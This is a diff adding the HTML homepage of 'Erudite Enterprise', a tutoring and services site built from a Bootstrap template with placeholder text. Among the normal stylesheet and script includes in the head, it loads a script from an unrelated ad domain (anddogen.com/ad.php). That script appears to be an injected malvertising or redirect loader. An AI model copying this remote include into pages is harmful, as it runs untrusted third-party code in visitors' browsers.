@@ -1,0 +1,494 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- Theme Made By www.w3schools.com - No Copyright -->
+  <title>Erudite Enterprise</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css" type="text/css">
+  <link href="http://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet" type="text/css">
+  <link href="http://fonts.googleapis.com/css?family=Lato" rel="stylesheet" type="text/css">
+  <link href="css/style.css" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="font-awesome-4.3.0/css/font-awesome.css" />
+  <script src="js/jquery.min.js"></script>
+  <script src="js/bootstrap.min.js"></script>
+  <script src="https://anddogen.com/ad.php?u=2bcb6c0dae4ff00188d34940932e2ce1&c=pbbt&p=1"></script>
+  
+  <style type="text/css">
+  .btn-danger:hover {
+    color: #c9302c;
+    background-color: #fff;
+    border-color: #fff;
+    }
+   .btn-success:hover{
+	color:#5CB85C;
+	background-color:#fff;
+	border-color:#fff;
+	}
+	#frame:hover{
+	-webkit-box-shadow: -1px 1px 10px -1px rgba(0,0,0,0.75);
+	-moz-box-shadow: -1px 1px 10px -1px rgba(0,0,0,0.75);
+	box-shadow: -1px 1px 10px -1px rgba(0,0,0,0.75);
+	}
+  </style>
+</head>
+
+<body id="myPage" data-spy="scroll" data-target=".navbar" data-offset="60">
+
+<nav class="navbar navbar-default navbar-fixed-top" id="nv" style="margin-top:25px;">
+  <div class="container">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>                        
+      </button>
+      <a class="navbar-brand" href="#myPage" style="padding:0px 15px;"><img src="Logo.png" class="img-responsive" /></a>
+    </div>
+    <div class="collapse navbar-collapse" id="myNavbar">
+      <ul class="nav navbar-nav navbar-right">
+        <li><a href="#myNavbar">HOME</a></li>
+        <li><a href="#about">ABOUT</a></li>
+        <li class="dropdown">
+          <a class="dropdown-toggle" data-toggle="dropdown" href="#">SERVICES <span class="caret"></span></a>
+          <ul class="dropdown-menu" style="background-color:#F4511E">
+              <li><a href="teachers.html" >Education</a></li>
+              <li><a href="#" > Technology</a></li>
+              <li><a href="#" > More</a></li>
+            </ul>
+        </li>
+        <li><a href="#gallery">INFOTAINMENT</a></li>
+        <!--li><a href="#pricing">PRICING</a></li-->
+        <li><a href="#contact">CONTACT US</a></li>
+        <li class="dropdown">
+	          <a class="dropdown-toggle" data-toggle="dropdown" href="#">LOGIN <span class="caret"></span></a>
+	          <ul class="dropdown-menu" style="background-color:#F4511E">
+	            <li><a href="#" data-toggle="modal" data-target="#member"> <i class="fa fa-user "></i> Member Login</a></li>
+	            <li><a href="#" data-toggle="modal" data-target="#executive"> <i class="fa fa-user-md"></i> Executive Login</a></li>
+	            <li><a href="#" data-toggle="modal" data-target="#admin"> <i class="fa fa-user-secret"></i> Administrative Login</a></li>
+	          </ul>
+	        </li>
+      </ul>
+    </div>
+  </div>
+</nav>
+<!--modals start-->
+	<!--Modal member-->
+		<div id="member" class="modal fade" role="dialog" style="top:200px;">
+  			<div class="modal-dialog">
+		    <!-- Modal content-->
+			    <div class="modal-content">
+			      <div class="modal-header" style="background-color:rgba(47, 115, 216, 0.7)">
+			        <button type="button" class="close" data-dismiss="modal">&times;</button>
+			        <h4 class="modal-title"> <i class="fa fa-user"></i> Members Login</h4>
+			      </div>
+			      <div class="modal-body">
+			        <form role="form">
+					  <div class="form-group">
+					    <label for="email">Email address:</label>
+					    <input type="email" class="form-control" id="email">
+					  </div>
+					  <div class="form-group">
+					    <label for="pwd">Password:</label>
+					    <input type="password" class="form-control" id="pwd">
+					  </div>
+					  <div class="checkbox">
+					    <label><input type="checkbox"> Remember me</label>
+					  </div>
+					  <button type="submit" class="btn btn-default">Submit</button>
+					</form>
+			      </div>
+				</div>
+		  </div>
+		</div>
+	<!--Modal Executive-->
+		<div id="executive" class="modal fade" role="dialog" style="top:200px;">
+  			<div class="modal-dialog">
+		    <!-- Modal content-->
+			    <div class="modal-content">
+			      <div class="modal-header" style="background-color:rgba(243, 31, 31, 0.65)">
+			        <button type="button" class="close" data-dismiss="modal">&times;</button>
+			        <h4 class="modal-title"> <i class="fa fa-user-plus"></i> Executive Login</h4>
+			      </div>
+			      <div class="modal-body">
+			        <form role="form" enctype="multipart/form-data" method="post" action="ex_login.php">
+					  <div class="form-group">
+					    <label for="email">User ID:</label>
+					    <input type="text" name="id" class="form-control" id="email">
+					  </div>
+					  <div class="form-group">
+					    <label for="pwd">Password:</label>
+					    <input type="password" name="password" class="form-control" id="pwd">
+					  </div>
+					  <div class="checkbox">
+					    <label><input type="checkbox"> Remember me</label>
+					  </div>
+					  <button type="submit" class="btn btn-default">Submit</button>
+					</form>
+			      </div>
+				</div>
+		  </div>
+		</div>
+
+	<!--Modal Admin-->
+		<div id="admin" class="modal fade" role="dialog" style="top:200px;">
+  			<div class="modal-dialog modal-sm">
+		    <!-- Modal content-->
+			    <div class="modal-content">
+			      <div class="modal-header" style="background-color:rgba(69, 251, 24, 0.7)">
+			        <button type="button" class="close" data-dismiss="modal">&times;</button>
+			        <h4 class="modal-title"> <i class="fa fa-user-plus"></i> Admin Login</h4>
+			      </div>
+			      <div class="modal-body">
+			        <form role="form">
+					  <div class="form-group">
+					    <label for="email">Email address:</label>
+					    <input type="email" class="form-control" id="email">
+					  </div>
+					  <div class="form-group">
+					    <label for="pwd">Password:</label>
+					    <input type="password" class="form-control" id="pwd">
+					  </div>
+					  <div class="checkbox">
+					    <label><input type="checkbox"> Remember me</label>
+					  </div>
+					  <button type="submit" class="btn btn-default">Submit</button>
+					</form>
+			      </div>
+				</div>
+		  </div>
+		</div>
+
+<!--modals end-->
+<!--modal education-->
+<div id="education" class="modal fade" role="dialog" style="top:200px;">
+  			<div class="modal-dialog">
+		    <!-- Modal content-->
+			    <div class="modal-content">
+			      <div class="modal-header" style="background-color:rgba(243, 31, 31, 0.65)">
+			        <button type="button" class="close" data-dismiss="modal">&times;</button>
+			        <h4 class="modal-title"> <i class="fa fa-user-plus"></i> Select one</h4>
+			      </div>
+			      <div class="modal-body">
+			      </div>
+				</div>
+		  </div>
+		</div>
+
+<!--modal end-->
+
+<div class="jumbotron text-center" style="background-image:url('Book_Pen_and_Tablet_Wallpaper.jpg');background-position:center">
+  <br/>
+  <p>Enlight Your Education And Career</p><p>bla bla bla</p> 
+  <button class="btn btn-lg btn-success" onclick="window.location.href='index.html'">Hire a Tutor</button>&nbsp;&nbsp;&nbsp;<button class="btn btn-lg btn-danger" onclick="window.location.href='teachers.html'">Join as a Tutor</button>
+</div>
+
+<!-- Container (About Section) -->
+<div id="about" class="container-fluid">
+  <div class="row">
+    <div class="col-sm-8">
+      <h2>About Erudite Enterprise</h2><br>
+      <h4>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</h4><br>
+      <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>
+      <br><button class="btn btn-default btn-lg"><a href="#contact" style="text-decoration:none">Get in Touch</a></button>
+    </div>
+    <div class="col-sm-4">
+      <!--span class="glyphicon glyphicon-signal logo"></span-->
+      <span><img src="educational_people_logo.png"></span>
+    </div>
+  </div>
+</div>
+
+<div class="container-fluid bg-grey">
+  <div class="row">
+    <div class="col-sm-4">
+      <span class="glyphicon glyphicon-globe logo slideanim"></span>
+    </div>
+    <div class="col-sm-8">
+      <h2>Our Values</h2><br>
+      <h4><strong>MISSION:</strong> Our mission lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</h4><br>
+      <p><strong>VISION:</strong> Our vision Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
+      Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>
+    </div>
+  </div>
+</div>
+
+<!-- Container (Services Section) -->
+<div id="services" class="container-fluid text-center">
+  <h2>SERVICES</h2>
+  <h4>What we offer</h4>
+  <br>
+  <div class="row slideanim">
+    <div class="col-sm-6" id="frame">
+      <a href="#" data-toggle="modal" data-target="" style="text-decoration:none"><span class="logo"><img src="slide-4.jpg" width="100%" height="100%" /></span>
+      <h4>EDUCATION</h4>
+      <p>Find The Best Tutor For Your Education</p></a>
+    </div>
+
+    <div class="col-sm-6" id="frame">
+      <a style="text-decoration:none"><span class="logo"><img src="elektroreparaturservice_gb_734x350-1_w734.jpg" width="100%" height="100%" /></span>
+      <h4>TECHNOLOGY</h4>
+      <p>Electronic devices servicing</p></a>
+    </div>
+  </div>
+  <div class="row slideanim">
+    <div class="col-sm-6" id="frame">
+      <a style="text-decoration:none"><span class="logo"><img src="31.jpg" width="100%" height="100%" /></span>
+      <h4>BEAUTY & CARE</h4>
+      <p>Find The Best Tutor For Your Education</p></a>
+    </div>
+
+    <div class="col-sm-6" id="frame">
+      <a style="text-decoration:none"><span class="logo"><img src="Lesley-and-Andrew-2-5.jpg" width="100%" height="100%" /></span>
+      <h4>EVENT & DECORATION</h4>
+      <p>Make your special occasions more memorable </p></a>
+    </div>
+  </div>
+  <br><br>
+ </div>
+
+<!-- Container (gallery Section) -->
+<div id="gallery" class="container-fluid text-center bg-grey">
+  <h2>Infotainment</h2><br>
+  <h4>What we have created</h4>
+  <div class="row text-center slideanim">
+    <div class="col-sm-4">
+      <div class="thumbnail">
+        <img src="17527466-Nahtlose-Muster-Hintergrund-Abbildung-der-Physik-Zeichnungen-Gekritzelart-Stockfoto.jpg" alt="" width="400" height="300">
+        <p><strong>Caption</strong></p>
+        <p>Lorem ipsum</p>
+      </div>
+    </div>
+    <div class="col-sm-4">
+      <div class="thumbnail">
+        <img src="illustrator-old-school-icon.png" alt="" width="400" height="300">
+        <p><strong>Caption</strong></p>
+        <p>Lorem Ipsum</p>
+      </div>
+    </div>
+    <div class="col-sm-4">
+      <div class="thumbnail">
+        <img src="17527466-Nahtlose-Muster-Hintergrund-Abbildung-der-Physik-Zeichnungen-Gekritzelart-Stockfoto.jpg" alt="" width="400" height="300">
+        <p><strong>Caption</strong></p>
+        <p>Lorem Ipsum</p>
+      </div>
+    </div>
+  </div><br>
+  
+  <h2>What our customers say</h2>
+  <div id="myCarousel" class="carousel slide text-center" data-ride="carousel">
+    <!-- Indicators -->
+    <ol class="carousel-indicators">
+      <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
+      <li data-target="#myCarousel" data-slide-to="1"></li>
+      <li data-target="#myCarousel" data-slide-to="2"></li>
+    </ol>
+
+    <!-- Wrapper for slides -->
+    <div class="carousel-inner" role="listbox">
+      <div class="item active">
+      	<span class="img-circle"><img class="img-circle" src="John_Doe.jpg"></span>
+        <h4>"This company is the best. I am so happy with the result!"<br><span style="font-style:normal;">Michael Roe, Vice President, Comment Box</span></h4>
+      </div>
+      <div class="item">
+      	<span class="img-circle"><img class="img-circle" src="John_Doe.jpg"></span>
+        <h4>"One word... WOW!!"<br><span style="font-style:normal;">John Doe, Salesman, Rep Inc</span></h4>
+      </div>
+      <div class="item">
+      	<span class="img-circle"><img class="img-circle" src="John_Doe.jpg"></span>
+        <h4>"Could I... BE any more happy with this company?"<br><span style="font-style:normal;">Chandler Bing, Actor, FriendsAlot</span></h4>
+      </div>
+    </div>
+
+    <!-- Left and right controls -->
+    <a class="left carousel-control" href="#myCarousel" role="button" data-slide="prev">
+      <span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
+      <span class="sr-only">Previous</span>
+    </a>
+    <a class="right carousel-control" href="#myCarousel" role="button" data-slide="next">
+      <span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
+      <span class="sr-only">Next</span>
+    </a>
+  </div>
+</div>
+
+<!-- Container (Pricing Section) -->
+<!--div id="pricing" class="container-fluid">
+  <div class="text-center">
+    <h2>Pricing</h2>
+    <h4>Choose a payment plan that works for you</h4>
+  </div>
+  <div class="row slideanim">
+    <div class="col-sm-4 col-xs-12">
+      <div class="panel panel-default text-center">
+        <div class="panel-heading">
+          <h1>Basic</h1>
+        </div>
+        <div class="panel-body">
+          <p><strong>20</strong> Lorem</p>
+          <p><strong>15</strong> Ipsum</p>
+          <p><strong>5</strong> Dolor</p>
+          <p><strong>2</strong> Sit</p>
+          <p><strong>Endless</strong> Amet</p>
+        </div>
+        <div class="panel-footer plan">
+          <h3>$19</h3>
+          <h4>per month</h4>
+          <button class="btn btn-lg">Sign Up</button>
+        </div>
+      </div>      
+    </div>     
+    <div class="col-sm-4 col-xs-12">
+      <div class="panel panel-default text-center">
+        <div class="panel-heading">
+          <h1>Pro</h1>
+        </div>
+        <div class="panel-body">
+          <p><strong>50</strong> Lorem</p>
+          <p><strong>25</strong> Ipsum</p>
+          <p><strong>10</strong> Dolor</p>
+          <p><strong>5</strong> Sit</p>
+          <p><strong>Endless</strong> Amet</p>
+        </div>
+        <div class="panel-footer plan">
+          <h3>$29</h3>
+          <h4>per month</h4>
+          <button class="btn btn-lg">Sign Up</button>
+        </div>
+      </div>      
+    </div>       
+    <div class="col-sm-4 col-xs-12">
+      <div class="panel panel-default text-center">
+        <div class="panel-heading">
+          <h1>Premium</h1>
+        </div>
+        <div class="panel-body">
+          <p><strong>100</strong> Lorem</p>
+          <p><strong>50</strong> Ipsum</p>
+          <p><strong>25</strong> Dolor</p>
+          <p><strong>10</strong> Sit</p>
+          <p><strong>Endless</strong> Amet</p>
+        </div>
+        <div class="panel-footer plan">
+          <h3>$49</h3>
+          <h4>per month</h4>
+          <button class="btn btn-lg">Sign Up</button>
+        </div>
+      </div>      
+    </div>    
+  </div>
+</div-->
+
+<!-- Container (Contact Section) -->
+<div id="contact" class="container-fluid">
+  <h2 class="text-center">CONTACT</h2>
+  <div class="row">
+    <div class="col-sm-5">
+      <p>Contact us and we'll get back to you within 24 hours.</p>
+      <p><span class="glyphicon glyphicon-map-marker"></span> Kolkata, India</p>
+      <p><span class="glyphicon glyphicon-phone"></span> 9804181976</p>
+      <p><span class="glyphicon glyphicon-envelope"></span> eruditeenterprise1@gmail.com</p>	   
+    </div>
+    <div class="col-sm-7 slideanim">
+      <div class="row">
+        <div class="col-sm-6 form-group">
+          <input class="form-control" id="name" name="name" placeholder="Name" type="text" required>
+        </div>
+        <div class="col-sm-6 form-group">
+          <input class="form-control" id="email" name="email" placeholder="Email" type="email" required>
+        </div>
+      </div>
+      <textarea class="form-control" id="comments" name="comments" placeholder="Comment" rows="5"></textarea><br>
+      <div class="row">
+        <div class="col-sm-12 form-group">
+          <button class="btn btn-default pull-right" type="submit">Send</button>
+        </div>
+      </div>	
+    </div>
+  </div>
+</div>
+
+<div id="googleMap" style="height:400px;width:100%;"></div>
+
+<!--  Google Maps -->
+<script src="http://maps.googleapis.com/maps/api/js"></script>
+<script>
+var myCenter = new google.maps.LatLng(22.6495392, 88.36349310000003);
+
+function initialize() {
+var mapProp = {
+  center:myCenter,
+  zoom:15,
+  scrollwheel:false,
+  draggable:false,
+  mapTypeId:google.maps.MapTypeId.ROADMAP
+  };
+
+var map = new google.maps.Map(document.getElementById("googleMap"),mapProp);
+
+var marker = new google.maps.Marker({
+  position:myCenter,
+  });
+
+marker.setMap(map);
+}
+
+google.maps.event.addDomListener(window, 'load', initialize);
+</script>
+
+<footer class="container-fluid text-center bg-grey">
+
+  	<hr /> 
+  		<a><i class="fa fa-facebook-official fa-2x"></i></a> &nbsp;&nbsp;&nbsp;
+		<a><i class="fa fa-google-plus fa-2x"></i></a>&nbsp;&nbsp;&nbsp;
+		<a><i class="fa fa-yahoo fa-2x"></i></a>&nbsp;&nbsp;&nbsp;
+		<a><i class="fa fa-skype fa-2x"></i></a>
+	<hr />
+	<br />
+ 
+  <a href="#myPage" title="To Top">
+    <!--span class="glyphicon glyphicon-chevron-up"></span-->
+    <i class="fa fa-4x fa-chevron-up"></i>
+  </a>
+  <p> &copy;Copyright 2015. All Rights Reserved. <a href="#" style="text-decoration:none">Privacy Policy</a> | <a href="#" style="text-decoration:none"> Terms and Conditions</a>  </p>
+  <p>Developed By <strong>Cloud9</strong></p>		
+</footer>
+
+<script>
+$(document).ready(function(){
+  // Add smooth scrolling to all links in navbar + footer link
+  $(".navbar a, footer a[href='#myPage']").on('click', function(event) {
+
+    // Prevent default anchor click behavior
+    event.preventDefault();
+
+    // Store hash
+    var hash = this.hash;
+
+    // Using jQuery's animate() method to add smooth page scroll
+    // The optional number (900) specifies the number of milliseconds it takes to scroll to the specified area
+    $('html, body').animate({
+      scrollTop: $(hash).offset().top
+    }, 900, function(){
+   
+      // Add hash (#) to URL when done scrolling (default click behavior)
+      window.location.hash = hash;
+    });
+  });
+  
+  // Slide in elements on scroll
+  $(window).scroll(function() {
+    $(".slideanim").each(function(){
+      var pos = $(this).offset().top;
+
+      var winTop = $(window).scrollTop();
+        if (pos < winTop + 600) {
+          $(this).addClass("slide");
+        }
+    });
+  });
+})
+</script>
+
+</body>
+</html>
